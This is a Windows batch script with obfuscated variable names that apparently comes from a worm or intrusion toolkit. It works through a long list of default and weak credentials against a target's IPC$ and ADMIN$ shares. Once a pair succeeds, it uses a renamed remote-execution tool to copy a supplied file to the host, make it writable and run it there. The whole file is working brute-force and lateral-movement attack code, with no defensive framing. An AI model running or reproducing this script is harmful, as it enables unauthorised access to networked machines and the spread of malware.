@echo off
set howare=use
set hiall=net
set you=nav
set miss=if not errorlevel 1 goto
%hiall% %howare% \\%1\ipc$ "abc" /user:administrator
%miss% foo30
%hiall% %howare% \\%1\ipc$ "test" /user:test
%miss% foo4
%hiall% %howare% \\%1\ipc$ "test123" /user:administrator
%miss% foo5
%hiall% %howare% \\%1\ipc$ "student" /user:student
%miss% foo31
%hiall% %howare% \\%1\ipc$ "user" /user:user
%miss% foo34
%hiall% %howare% \\%1\ipc$ "teacher" /user:teacher
%miss% foo32
%hiall% %howare% \\%1\ipc$ "xxyyzz" /user:administrator
%miss% foo29
%hiall% %howare% \\%1\ipc$ "1" /user:administrator
%miss% foo26
%hiall% %howare% \\%1\ipc$ "123" /user:administrator
%miss% foo27
%hiall% %howare% \\%1\ipc$ "12345" /user:admin
%miss% foo28
%hiall% %howare% \\%1\ipc$ "temp" /user:administrator
%miss% foo6
%hiall% %howare% \\%1\ipc$ "Administrator" /user:administrator
%miss% foo2
%hiall% %howare% \\%1\ipc$ "Administrator" /user:Administrator
%miss% foo37
%hiall% %howare% \\%1\ipc$ "test" /user:administrator
%miss% foo3
%hiall% %howare% \\%1\ipc$ "admin" /user:administrator
%miss% foo10
%hiall% %howare% \\%1\ipc$ "temp123" /user:administrator
%miss% foo7
%hiall% %howare% \\%1\ipc$ "pass" /user:administrator
%miss% foo8
%hiall% %howare% \\%1\ipc$ "password" /user:administrator
%miss% foo9
%hiall% %howare% \\%1\ipc$ "root" /user:root
%miss% foo11
%hiall% %howare% \\%1\ipc$ "changeme" /user:administrator
%miss% foo12
%hiall% %howare% \\%1\ipc$ "admin" /user:admin
%miss% foo13
%hiall% %howare% \\%1\ipc$ "123456" /user:administrator
%miss% foo14
%hiall% %howare% \\%1\ipc$ "654321" /user:administrator
%miss% foo15
%hiall% %howare% \\%1\ipc$ "abc123" /user:administrator
%miss% foo16
%hiall% %howare% \\%1\ipc$ "12345" /user:administrator
%miss% foo36
%hiall% %howare% \\%1\ipc$ "red123" /user:administrator
%miss% foo17
%hiall% %howare% \\%1\ipc$ "admin123" /user:administrator
%miss% foo18
%hiall% %howare% \\%1\ipc$ "qwerty" /user:administrator
%miss% foo19
%hiall% %howare% \\%1\ipc$ "asdf" /user:administrator
%miss% foo20
%hiall% %howare% \\%1\ipc$ "password123" /user:administrator
%miss% foo21
%hiall% %howare% \\%1\ipc$ "secret" /user:administrator
%miss% foo22
%hiall% %howare% \\%1\ipc$ "qwertyuiop" /user:administrator
%miss% foo23
%hiall% %howare% \\%1\ipc$ "12345" /user:administrator
%miss% foo24
%hiall% %howare% \\%1\ipc$ "54321" /user:administrator
%miss% foo25
%hiall% %howare% \\%1\ipc$ "" /user:administrator
%miss% foo1
%hiall% %howare% \\%1\ipc$ "" /user:Administrator
%miss% foo35
%hiall% %howare% \\%1\ipc$ "" /user:admin
%miss% foo38
%hiall% %howare% \\%1\ipc$ "" /user:user
%miss% foo33
%hiall% %howare% \\%1\ipc$ "" /user:Admin
%miss% foo39
%hiall% %howare% \\%1\ipc$ "" /user:root
%miss% foo40
%hiall% %howare% \\%1\ipc$ "" /user:ROOT
%miss% foo41
%hiall% %howare% \\%1\ipc$ "" /user:wwwadmin
%miss% foo42
%hiall% %howare% \\%1\ipc$ "" /user:database
%miss% foo43
%hiall% %howare% \\%1\ipc$ "" /user:user
%miss% foo44
%hiall% %howare% \\%1\ipc$ "" /user:server
%miss% foo45
%hiall% %howare% \\%1\ipc$ "" /user:OEM
%miss% foo46
%hiall% %howare% \\%1\ipc$ "" /user:administrateur
%miss% foo47
%hiall% %howare% \\%1\ipc$ "" /user:Owner
%miss% foo48
%hiall% %howare% \\%1\ipc$ "" /user:OWNER
%miss% foo49
%hiall% %howare% \\%1\ipc$ "" /user:owner
%miss% foo50
%hiall% %howare% \\%1\ipc$ "admin" /user:wwwadmin
%miss% foo51
%hiall% %howare% \\%1\ipc$ "wwwadmin" /user:wwwadmin
%miss% foo52
%hiall% %howare% \\%1\ipc$ "database" /user:database
%miss% foo53
%hiall% %howare% \\%1\ipc$ "computer" /user:Administrator
%miss% foo54
%hiall% %howare% \\%1\ipc$ "computer" /user:OEM
%miss% foo55
%hiall% %howare% \\%1\ipc$ "1234" /user:OEM
%miss% foo56
%hiall% %howare% \\%1\ipc$ "admin" /user:OEM
%miss% foo57
%hiall% %howare% \\%1\ipc$ "secret" /user:OEM
%miss% foo58
%hiall% %howare% \\%1\ipc$ "administrator" /user:OEM
%miss% foo59
%hiall% %howare% \\%1\ipc$ "Admin" /user:OEM
%miss% foo60
%hiall% %howare% \\%1\ipc$ "qwerty" /user:OEM
%miss% foo61
%hiall% %howare% \\%1\ipc$ "password" /user:OEM
%miss% foo62
%hiall% %howare% \\%1\ipc$ "temp" /user:Owner
%miss% foo63
%hiall% %howare% \\%1\ipc$ "1" /user:Owner
%miss% foo64
%hiall% %howare% \\%1\ipc$ "12" /user:Owner
%miss% foo65
%hiall% %howare% \\%1\ipc$ "123" /user:Owner
%miss% foo66
%hiall% %howare% \\%1\ipc$ "1234" /user:Owner
%miss% foo67
%hiall% %howare% \\%1\ipc$ "12345" /user:Owner
%miss% foo68
%hiall% %howare% \\%1\ipc$ "Owner" /user:Owner
%miss% foo69
%hiall% %howare% \\%1\ipc$ "admin" /user:Owner
%miss% foo70
%hiall% %howare% \\%1\ipc$ "secret" /user:Owner
%miss% foo71
%hiall% %howare% \\%1\ipc$ "computer" /user:Owner
%miss% foo72
%hiall% %howare% \\%1\ipc$ "!@#$" /user:Owner
%miss% foo73
%hiall% %howare% \\%1\ipc$ "changeme" /user:Owner
%miss% foo74
%hiall% %howare% \\%1\ipc$ "password" /user:Owner
%miss% foo75
%hiall% %howare% \\%1\admin$ "" /user:Administrator
%miss% foo76
%hiall% %howare% \\%1\admin$ "" /user:Admin
%miss% foo77
%hiall% %howare% \\%1\admin$ "" /user:guest
%miss% foo78
%hiall% %howare% \\%1\admin$ "" /user:Guest
%miss% foo79
%hiall% %howare% \\%1\admin$ "" /user:temp
%miss% foo80
%hiall% %howare% \\%1\admin$ "" /user:Temp
%miss% foo81
%hiall% %howare% \\%1\admin$ "" /user:root
%miss% foo82
%hiall% %howare% \\%1\admin$ "" /user:ROOT
%miss% foo83
%hiall% %howare% \\%1\admin$ "" /user:administrator
%miss% foo84
%hiall% %howare% \\%1\admin$ "" /user:Owner
%miss% foo85
%hiall% %howare% \\%1\admin$ "123" /user:administrator
%miss% foo86
%hiall% %howare% \\%1\admin$ "temp" /user:Owner
%miss% foo87
%hiall% %howare% \\%1\admin$ "1" /user:Owner
%miss% foo88
%hiall% %howare% \\%1\admin$ "12" /user:Owner
%miss% foo89
%hiall% %howare% \\%1\admin$ "123" /user:Owner
%miss% foo90
%hiall% %howare% \\%1\admin$ "1234" /user:Owner
%miss% foo91
%hiall% %howare% \\%1\admin$ "12345" /user:Owner
%miss% foo92
%hiall% %howare% \\%1\admin$ "123" /user:OEM
%miss% foo93
%hiall% %howare% \\%1\admin$ "" /user:OEM
%miss% foo94
%hiall% %howare% \\%1\admin$ "Administrator" /user:Administrator
%miss% foo95
%hiall% %howare% \\%1\admin$ "Admin" /user:Administrator
%miss% foo96
%hiall% %howare% \\%1\admin$ "12345" /user:Administrator
%miss% foo97
%hiall% %howare% \\%1\admin$ "secret" /user:Administrator
%miss% foo98
%hiall% %howare% \\%1\admin$ "changeme" /user:Administrator
%miss% foo99
%hiall% %howare% \\%1\admin$ "teacher" /user:Administrator
%miss% foo100
%hiall% %howare% \\%1\admin$ "private" /user:Administrator
%miss% foo101
%hiall% %howare% \\%1\admin$ "computer" /user:Administrator
%miss% foo102
%hiall% %howare% \\%1\admin$ "windows" /user:Administrator
%miss% foo103
goto fooend
:foo11
%you% \\%1 -u root -p "root" -d attrib.exe -r %2
%you% \\%1 -u root -p "root" -f -c -d %2 -o
%you% \\%1 -u root -p "root" -d %2 -o
goto fooend
:foo1
%you% \\%1 -u administrator -p "" -d attrib.exe -r %2
%you% \\%1 -u administrator -p "" -f -c -d %2 -o
%you% \\%1 -u administrator -p "" -d %2 -o
goto fooend
:foo2
%you% \\%1 -u administrator -p "Administrator" -d attrib.exe -r %2
%you% \\%1 -u administrator -p "Administrator" -f -c -d %2 -o
%you% \\%1 -u administrator -p "Administrator" -d %2 -o
goto fooend
:foo38
%you% \\%1 -u admin -p "" -d attrib.exe -r %2
%you% \\%1 -u admin -p "" -f -c -d %2 -o
%you% \\%1 -u admin -p "" -d %2 -o
goto fooend
:foo37
%you% \\%1 -u Administrator -p "Administrator" -d attrib.exe -r %2
%you% \\%1 -u Administrator -p "Administrator" -f -c -d %2 -o
%you% \\%1 -u Administrator -p "Administrator" -d %2 -o
goto fooend
:foo10
%you% \\%1 -u administrator -p "admin" -d attrib.exe -r %2
%you% \\%1 -u administrator -p "admin" -f -c -d %2 -o
%you% \\%1 -u administrator -p "admin" -d %2 -o
goto fooend
:foo13
%you% \\%1 -u admin -p "admin" -d attrib.exe -r %2
%you% \\%1 -u admin -p "admin" -f -c -d %2 -o
%you% \\%1 -u admin -p "admin" -d %2 -o
goto fooend
:foo3
%you% \\%1 -u administrator -p "test" -d attrib.exe -r %2
%you% \\%1 -u administrator -p "test" -f -c -d %2 -o
%you% \\%1 -u administrator -p "test" -d %2 -o
goto fooend
:foo4
%you% \\%1 -u test -p "test" -d attrib.exe -r %2
%you% \\%1 -u test -p "test" -f -c -d %2 -o
%you% \\%1 -u test -p "test" -d %2 -o
goto fooend
:foo5
%you% \\%1 -u administrator -p "test123" -d attrib.exe -r %2
%you% \\%1 -u administrator -p "test123" -f -c -d %2 -o
%you% \\%1 -u administrator -p "test123" -d %2 -o
goto fooend
:foo6
%you% \\%1 -u administrator -p "temp" -d attrib.exe -r %2
%you% \\%1 -u administrator -p "temp" -f -c -d %2 -o
%you% \\%1 -u administrator -p "temp" -d %2 -o
goto fooend
:foo7
%you% \\%1 -u administrator -p "temp123" -d attrib.exe -r %2
%you% \\%1 -u administrator -p "temp123" -f -c -d %2 -o
%you% \\%1 -u administrator -p "temp123" -d %2 -o
goto fooend
:foo8
%you% \\%1 -u administrator -p "pass" -d attrib.exe -r %2
%you% \\%1 -u administrator -p "pass" -f -c -d %2 -o
%you% \\%1 -u administrator -p "pass" -d %2 -o
goto fooend
:foo9
%you% \\%1 -u administrator -p "password" -d attrib.exe -r %2
%you% \\%1 -u administrator -p "password" -f -c -d %2 -o
%you% \\%1 -u administrator -p "password" -d %2 -o
goto fooend
:foo12
%you% \\%1 -u administrator -p "changeme" -d attrib.exe -r %2
%you% \\%1 -u administrator -p "changeme" -f -c -d %2 -o
%you% \\%1 -u administrator -p "changeme" -d %2 -o
goto fooend
:foo14
%you% \\%1 -u administrator -p "123456" -d attrib.exe -r %2
%you% \\%1 -u administrator -p "123456" -f -c -d %2 -o
%you% \\%1 -u administrator -p "123456" -d %2 -o
goto fooend
:foo15
%you% \\%1 -u administrator -p "654321" -d attrib.exe -r %2
%you% \\%1 -u administrator -p "654321" -f -c -d %2 -o
%you% \\%1 -u administrator -p "654321" -d %2 -o
goto fooend
:foo16
%you% \\%1 -u administrator -p "abc123" -d attrib.exe -r %2
%you% \\%1 -u administrator -p "abc123" -f -c -d %2 -o
%you% \\%1 -u administrator -p "abc123" -d %2 -o
goto fooend
:foo17
%you% \\%1 -u administrator -p "red123" -d attrib.exe -r %2
%you% \\%1 -u administrator -p "red123" -f -c -d %2 -o
%you% \\%1 -u administrator -p "red123" -d %2 -o
goto fooend
:foo18
%you% \\%1 -u administrator -p "admin123" -d attrib.exe -r %2
%you% \\%1 -u administrator -p "admin123" -f -c -d %2 -o
%you% \\%1 -u administrator -p "admin123" -d %2 -o
goto fooend
:foo19
%you% \\%1 -u administrator -p "qwerty" -d attrib.exe -r %2
%you% \\%1 -u administrator -p "qwerty" -f -c -d %2 -o
%you% \\%1 -u administrator -p "qwerty" -d %2 -o
goto fooend
:foo20
%you% \\%1 -u administrator -p "asdf" -d attrib.exe -r %2
%you% \\%1 -u administrator -p "asdf" -f -c -d %2 -o
%you% \\%1 -u administrator -p "asdf" -d %2 -o
goto fooend
:foo21
%you% \\%1 -u administrator -p "password123" -d attrib.exe -r %2
%you% \\%1 -u administrator -p "password123" -f -c -d %2 -o
%you% \\%1 -u administrator -p "password123" -d %2 -o
goto fooend
:foo22
%you% \\%1 -u administrator -p "secret" -d attrib.exe -r %2
%you% \\%1 -u administrator -p "secret" -f -c -d %2 -o
%you% \\%1 -u administrator -p "secret" -d %2 -o
goto fooend
:foo23
%you% \\%1 -u administrator -p "qwertyuiop" -d attrib.exe -r %2
%you% \\%1 -u administrator -p "qwertyuiop" -f -c -d %2 -o
%you% \\%1 -u administrator -p "qwertyuiop" -d %2 -o
goto fooend
:foo24
%you% \\%1 -u administrator -p "12345" -d attrib.exe -r %2
%you% \\%1 -u administrator -p "12345" -f -c -d %2 -o
%you% \\%1 -u administrator -p "12345" -d %2 -o
goto fooend
:foo25
%you% \\%1 -u administrator -p "54321" -d attrib.exe -r %2
%you% \\%1 -u administrator -p "54321" -f -c -d %2 -o
%you% \\%1 -u administrator -p "54321" -d %2 -o
goto fooend
:foo26
%you% \\%1 -u administrator -p "1" -d attrib.exe -r %2
%you% \\%1 -u administrator -p "1" -f -c -d %2 -o
%you% \\%1 -u administrator -p "1" -d %2 -o
goto fooend
:foo27
%you% \\%1 -u administrator -p "123" -d attrib.exe -r %2
%you% \\%1 -u administrator -p "123" -f -c -d %2 -o
%you% \\%1 -u administrator -p "123" -d %2 -o
goto fooend
:foo28
%you% \\%1 -u admin -p "12345" -d attrib.exe -r %2
%you% \\%1 -u admin -p "12345" -f -c -d %2 -o
%you% \\%1 -u admin -p "12345" -d %2 -o
goto fooend
:foo29
%you% \\%1 -u administrator -p "xxyyzz" -d attrib.exe -r %2
%you% \\%1 -u administrator -p "xxyyzz" -f -c -d %2 -o
%you% \\%1 -u administrator -p "xxyyzz" -d %2 -o
goto fooend
:foo30
%you% \\%1 -u administrator -p "abc" -d attrib.exe -r %2
%you% \\%1 -u administrator -p "abc" -f -c -d %2 -o
%you% \\%1 -u administrator -p "abc" -d %2 -o
goto fooend
:foo31
%you% \\%1 -u student -p "student" -d attrib.exe -r %2
%you% \\%1 -u student -p "student" -f -c -d %2 -o
%you% \\%1 -u student -p "student" -d %2 -o
goto fooend
:foo32
%you% \\%1 -u teacher -p "teacher" -d attrib.exe -r %2
%you% \\%1 -u teacher -p "teacher" -f -c -d %2 -o
%you% \\%1 -u teacher -p "teacher" -d %2 -o
goto fooend
:foo33
%you% \\%1 -u user -p "" -d attrib.exe -r %2
%you% \\%1 -u user -p "" -f -c -d %2 -o
%you% \\%1 -u user -p "" -d %2 -o
goto fooend
:foo34
%you% \\%1 -u user -p "user" -d attrib.exe -r %2
%you% \\%1 -u user -p "user" -f -c -d %2 -o
%you% \\%1 -u user -p "user" -d %2 -o
goto fooend
:foo35
%you% \\%1 -u Administrator -p "" -d attrib.exe -r %2
%you% \\%1 -u Administrator -p "" -f -c -d %2 -o
%you% \\%1 -u Administrator -p "" -d %2 -o
goto fooend
:foo36
%you% \\%1 -u administrator -p "12345" -d attrib.exe -r %2
%you% \\%1 -u administrator -p "12345" -f -c -d %2 -o
%you% \\%1 -u administrator -p "12345" -d %2 -o
goto fooend
:foo39
%you% \\%1 -u Admin -p "" -d attrib.exe -r %2
%you% \\%1 -u Admin -p "" -f -c -d %2 -o
%you% \\%1 -u Admin -p "" -d %2 -o
goto fooend
:foo40
%you% \\%1 -u root -p "" -d attrib.exe -r %2
%you% \\%1 -u root -p "" -f -c -d %2 -o
%you% \\%1 -u root -p "" -d %2 -o
goto fooend
:foo41
%you% \\%1 -u ROOT -p "" -d attrib.exe -r %2
%you% \\%1 -u ROOT -p "" -f -c -d %2 -o
%you% \\%1 -u ROOT -p "" -d %2 -o
goto fooend
:foo42
%you% \\%1 -u wwwadmin -p "" -d attrib.exe -r %2
%you% \\%1 -u wwwadmin -p "" -f -c -d %2 -o
%you% \\%1 -u wwwadmin -p "" -d %2 -o
goto fooend
:foo43
%you% \\%1 -u database -p "" -d attrib.exe -r %2
%you% \\%1 -u database -p "" -f -c -d %2 -o
%you% \\%1 -u database -p "" -d %2 -o
goto fooend
:foo44
%you% \\%1 -u user -p "" -d attrib.exe -r %2
%you% \\%1 -u user -p "" -f -c -d %2 -o
%you% \\%1 -u user -p "" -d %2 -o
goto fooend
:foo45
%you% \\%1 -u server -p "" -d attrib.exe -r %2
%you% \\%1 -u server -p "" -f -c -d %2 -o
%you% \\%1 -u server -p "" -d %2 -o
goto fooend
:foo46
%you% \\%1 -u OEM -p "" -d attrib.exe -r %2
%you% \\%1 -u OEM -p "" -f -c -d %2 -o
%you% \\%1 -u OEM -p "" -d %2 -o
goto fooend
:foo47
%you% \\%1 -u administrateur -p "" -d attrib.exe -r %2
%you% \\%1 -u administrateur -p "" -f -c -d %2 -o
%you% \\%1 -u administrateur -p "" -d %2 -o
goto fooend
:foo48
%you% \\%1 -u Owner -p "" -d attrib.exe -r %2
%you% \\%1 -u Owner -p "" -f -c -d %2 -o
%you% \\%1 -u Owner -p "" -d %2 -o
goto fooend
:foo49
%you% \\%1 -u OWNER -p "" -d attrib.exe -r %2
%you% \\%1 -u OWNER -p "" -f -c -d %2 -o
%you% \\%1 -u OWNER -p "" -d %2 -o
goto fooend
:foo50
%you% \\%1 -u owner -p "" -d attrib.exe -r %2
%you% \\%1 -u owner -p "" -f -c -d %2 -o
%you% \\%1 -u owner -p "" -d %2 -o
goto fooend
:foo51
%you% \\%1 -u wwwadmin -p "admin" -d attrib.exe -r %2
%you% \\%1 -u wwwadmin -p "admin" -f -c -d %2 -o
%you% \\%1 -u wwwadmin -p "admin" -d %2 -o
goto fooend
:foo52
%you% \\%1 -u wwwadmin -p "wwwadmin" -d attrib.exe -r %2
%you% \\%1 -u wwwadmin -p "wwwadmin" -f -c -d %2 -o
%you% \\%1 -u wwwadmin -p "wwwadmin" -d %2 -o
goto fooend
:foo53
%you% \\%1 -u database -p "database" -d attrib.exe -r %2
%you% \\%1 -u database -p "database" -f -c -d %2 -o
%you% \\%1 -u database -p "database" -d %2 -o
goto fooend
:foo54
%you% \\%1 -u Administrator -p "computer" -d attrib.exe -r %2
%you% \\%1 -u Administrator -p "computer" -f -c -d %2 -o
%you% \\%1 -u Administrator -p "computer" -d %2 -o
goto fooend
:foo55
%you% \\%1 -u OEM -p "computer" -d attrib.exe -r %2
%you% \\%1 -u OEM -p "computer" -f -c -d %2 -o
%you% \\%1 -u OEM -p "computer" -d %2 -o
goto fooend
:foo56
%you% \\%1 -u OEM -p "1234" -d attrib.exe -r %2
%you% \\%1 -u OEM -p "1234" -f -c -d %2 -o
%you% \\%1 -u OEM -p "1234" -d %2 -o
goto fooend
:foo57
%you% \\%1 -u OEM -p "admin" -d attrib.exe -r %2
%you% \\%1 -u OEM -p "admin" -f -c -d %2 -o
%you% \\%1 -u OEM -p "admin" -d %2 -o
goto fooend
:foo58
%you% \\%1 -u OEM -p "secret" -d attrib.exe -r %2
%you% \\%1 -u OEM -p "secret" -f -c -d %2 -o
%you% \\%1 -u OEM -p "secret" -d %2 -o
goto fooend
:foo59
%you% \\%1 -u OEM -p "administrator" -d attrib.exe -r %2
%you% \\%1 -u OEM -p "administrator" -f -c -d %2 -o
%you% \\%1 -u OEM -p "administrator" -d %2 -o
goto fooend
:foo60
%you% \\%1 -u OEM -p "Admin" -d attrib.exe -r %2
%you% \\%1 -u OEM -p "Admin" -f -c -d %2 -o
%you% \\%1 -u OEM -p "Admin" -d %2 -o
goto fooend
:foo61
%you% \\%1 -u OEM -p "qwerty" -d attrib.exe -r %2
%you% \\%1 -u OEM -p "qwerty" -f -c -d %2 -o
%you% \\%1 -u OEM -p "qwerty" -d %2 -o
goto fooend
:foo62
%you% \\%1 -u OEM -p "password" -d attrib.exe -r %2
%you% \\%1 -u OEM -p "password" -f -c -d %2 -o
%you% \\%1 -u OEM -p "password" -d %2 -o
goto fooend
:foo63
%you% \\%1 -u Owner -p "temp" -d attrib.exe -r %2
%you% \\%1 -u Owner -p "temp" -f -c -d %2 -o
%you% \\%1 -u Owner -p "temp" -d %2 -o
goto fooend
:foo64
%you% \\%1 -u Owner -p "1" -d attrib.exe -r %2
%you% \\%1 -u Owner -p "1" -f -c -d %2 -o
%you% \\%1 -u Owner -p "1" -d %2 -o
goto fooend
:foo65
%you% \\%1 -u Owner -p "12" -d attrib.exe -r %2
%you% \\%1 -u Owner -p "12" -f -c -d %2 -o
%you% \\%1 -u Owner -p "12" -d %2 -o
goto fooend
:foo66
%you% \\%1 -u Owner -p "123" -d attrib.exe -r %2
%you% \\%1 -u Owner -p "123" -f -c -d %2 -o
%you% \\%1 -u Owner -p "123" -d %2 -o
goto fooend
:foo67
%you% \\%1 -u Owner -p "1234" -d attrib.exe -r %2
%you% \\%1 -u Owner -p "1234" -f -c -d %2 -o
%you% \\%1 -u Owner -p "1234" -d %2 -o
goto fooend
:foo68
%you% \\%1 -u Owner -p "12345" -d attrib.exe -r %2
%you% \\%1 -u Owner -p "12345" -f -c -d %2 -o
%you% \\%1 -u Owner -p "12345" -d %2 -o
goto fooend
:foo69
%you% \\%1 -u Owner -p "Owner" -d attrib.exe -r %2
%you% \\%1 -u Owner -p "Owner" -f -c -d %2 -o
%you% \\%1 -u Owner -p "Owner" -d %2 -o
goto fooend
:foo70
%you% \\%1 -u Owner -p "admin" -d attrib.exe -r %2
%you% \\%1 -u Owner -p "admin" -f -c -d %2 -o
%you% \\%1 -u Owner -p "admin" -d %2 -o
goto fooend
:foo71
%you% \\%1 -u Owner -p "secret" -d attrib.exe -r %2
%you% \\%1 -u Owner -p "secret" -f -c -d %2 -o
%you% \\%1 -u Owner -p "secret" -d %2 -o
goto fooend
:foo72
%you% \\%1 -u Owner -p "computer" -d attrib.exe -r %2
%you% \\%1 -u Owner -p "computer" -f -c -d %2 -o
%you% \\%1 -u Owner -p "computer" -d %2 -o
goto fooend
:foo73
%you% \\%1 -u Owner -p "!@#$" -d attrib.exe -r %2
%you% \\%1 -u Owner -p "!@#$" -f -c -d %2 -o
%you% \\%1 -u Owner -p "!@#$" -d %2 -o
goto fooend
:foo74
%you% \\%1 -u Owner -p "changeme" -d attrib.exe -r %2
%you% \\%1 -u Owner -p "changeme" -f -c -d %2 -o
%you% \\%1 -u Owner -p "changeme" -d %2 -o
goto fooend
:foo75
%you% \\%1 -u Owner -p "password" -d attrib.exe -r %2
%you% \\%1 -u Owner -p "password" -f -c -d %2 -o
%you% \\%1 -u Owner -p "password" -d %2 -o
goto fooend
:foo76
%you% \\%1 -u Administrator -p "" -d attrib.exe -r %2
%you% \\%1 -u Administrator -p "" -f -c -d %2 -o
%you% \\%1 -u Administrator -p "" -d %2 -o
goto fooend
:foo77
%you% \\%1 -u Admin -p "" -d attrib.exe -r %2
%you% \\%1 -u Admin -p "" -f -c -d %2 -o
%you% \\%1 -u Admin -p "" -d %2 -o
goto fooend
:foo78
%you% \\%1 -u guest -p "" -d attrib.exe -r %2
%you% \\%1 -u guest -p "" -f -c -d %2 -o
%you% \\%1 -u guest -p "" -d %2 -o
goto fooend
:foo79
%you% \\%1 -u Guest -p "" -d attrib.exe -r %2
%you% \\%1 -u Guest -p "" -f -c -d %2 -o
%you% \\%1 -u Guest -p "" -d %2 -o
goto fooend
:foo80
%you% \\%1 -u temp -p "" -d attrib.exe -r %2
%you% \\%1 -u temp -p "" -f -c -d %2 -o
%you% \\%1 -u temp -p "" -d %2 -o
goto fooend
:foo81
%you% \\%1 -u Temp -p "" -d attrib.exe -r %2
%you% \\%1 -u Temp -p "" -f -c -d %2 -o
%you% \\%1 -u Temp -p "" -d %2 -o
goto fooend
:foo82
%you% \\%1 -u root -p "" -d attrib.exe -r %2
%you% \\%1 -u root -p "" -f -c -d %2 -o
%you% \\%1 -u root -p "" -d %2 -o
goto fooend
:foo83
%you% \\%1 -u ROOT -p "" -d attrib.exe -r %2
%you% \\%1 -u ROOT -p "" -f -c -d %2 -o
%you% \\%1 -u ROOT -p "" -d %2 -o
goto fooend
:foo84
%you% \\%1 -u administrator -p "" -d attrib.exe -r %2
%you% \\%1 -u administrator -p "" -f -c -d %2 -o
%you% \\%1 -u administrator -p "" -d %2 -o
goto fooend
:foo85
%you% \\%1 -u Owner -p "" -d attrib.exe -r %2
%you% \\%1 -u Owner -p "" -f -c -d %2 -o
%you% \\%1 -u Owner -p "" -d %2 -o
goto fooend
:foo86
%you% \\%1 -u administrator -p "123" -d attrib.exe -r %2
%you% \\%1 -u administrator -p "123" -f -c -d %2 -o
%you% \\%1 -u administrator -p "123" -d %2 -o
goto fooend
:foo87
%you% \\%1 -u Owner -p "temp" -d attrib.exe -r %2
%you% \\%1 -u Owner -p "temp" -f -c -d %2 -o
%you% \\%1 -u Owner -p "temp" -d %2 -o
goto fooend
:foo88
%you% \\%1 -u Owner -p "1" -d attrib.exe -r %2
%you% \\%1 -u Owner -p "1" -f -c -d %2 -o
%you% \\%1 -u Owner -p "1" -d %2 -o
goto fooend
:foo89
%you% \\%1 -u Owner -p "12" -d attrib.exe -r %2
%you% \\%1 -u Owner -p "12" -f -c -d %2 -o
%you% \\%1 -u Owner -p "12" -d %2 -o
goto fooend
:foo90
%you% \\%1 -u Owner -p "123" -d attrib.exe -r %2
%you% \\%1 -u Owner -p "123" -f -c -d %2 -o
%you% \\%1 -u Owner -p "123" -d %2 -o
goto fooend
:foo91
%you% \\%1 -u Owner -p "1234" -d attrib.exe -r %2
%you% \\%1 -u Owner -p "1234" -f -c -d %2 -o
%you% \\%1 -u Owner -p "1234" -d %2 -o
goto fooend
:foo92
%you% \\%1 -u Owner -p "12345" -d attrib.exe -r %2
%you% \\%1 -u Owner -p "12345" -f -c -d %2 -o
%you% \\%1 -u Owner -p "12345" -d %2 -o
goto fooend
:foo93
%you% \\%1 -u OEM -p "123" -d attrib.exe -r %2
%you% \\%1 -u OEM -p "123" -f -c -d %2 -o
%you% \\%1 -u OEM -p "123" -d %2 -o
goto fooend
:foo94
%you% \\%1 -u OEM -p "" -d attrib.exe -r %2
%you% \\%1 -u OEM -p "" -f -c -d %2 -o
%you% \\%1 -u OEM -p "" -d %2 -o
goto fooend
:foo95
%you% \\%1 -u Administrator -p "Administrator" -d attrib.exe -r %2
%you% \\%1 -u Administrator -p "Administrator" -f -c -d %2 -o
%you% \\%1 -u Administrator -p "Administrator" -d %2 -o
goto fooend
:foo96
%you% \\%1 -u Administrator -p "Admin" -d attrib.exe -r %2
%you% \\%1 -u Administrator -p "Admin" -f -c -d %2 -o
%you% \\%1 -u Administrator -p "Admin" -d %2 -o
goto fooend
:foo97
%you% \\%1 -u Administrator -p "12345" -d attrib.exe -r %2
%you% \\%1 -u Administrator -p "12345" -f -c -d %2 -o
%you% \\%1 -u Administrator -p "12345" -d %2 -o
goto fooend
:foo98
%you% \\%1 -u Administrator -p "secret" -d attrib.exe -r %2
%you% \\%1 -u Administrator -p "secret" -f -c -d %2 -o
%you% \\%1 -u Administrator -p "secret" -d %2 -o
goto fooend
:foo99
%you% \\%1 -u Administrator -p "changeme" -d attrib.exe -r %2
%you% \\%1 -u Administrator -p "changeme" -f -c -d %2 -o
%you% \\%1 -u Administrator -p "changeme" -d %2 -o
goto fooend
:foo100
%you% \\%1 -u Administrator -p "teacher" -d attrib.exe -r %2
%you% \\%1 -u Administrator -p "teacher" -f -c -d %2 -o
%you% \\%1 -u Administrator -p "teacher" -d %2 -o
goto fooend
:foo101
%you% \\%1 -u Administrator -p "private" -d attrib.exe -r %2
%you% \\%1 -u Administrator -p "private" -f -c -d %2 -o
%you% \\%1 -u Administrator -p "private" -d %2 -o
goto fooend
:foo102
%you% \\%1 -u Administrator -p "computer" -d attrib.exe -r %2
%you% \\%1 -u Administrator -p "computer" -f -c -d %2 -o
%you% \\%1 -u Administrator -p "computer" -d %2 -o
goto fooend
:foo103
%you% \\%1 -u Administrator -p "windows" -d attrib.exe -r %2
%you% \\%1 -u Administrator -p "windows" -f -c -d %2 -o
%you% \\%1 -u Administrator -p "windows" -d %2 -o
goto fooend
:fooend
